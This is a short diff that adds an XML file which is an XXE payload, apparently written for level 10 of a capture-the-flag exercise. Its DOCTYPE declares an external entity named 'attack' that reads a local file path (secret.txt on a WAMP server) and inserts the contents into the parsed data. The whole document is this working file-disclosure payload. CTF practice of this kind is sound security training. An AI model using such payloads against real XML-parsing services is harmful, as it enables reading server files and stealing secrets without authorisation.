@@ -1,0 +1,5 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+    <!ENTITY attack SYSTEM "file:///C:/wamp64/www/2bgp-ctf/levels/10/secret.txt">
+]>
+<data>&attack;</data>
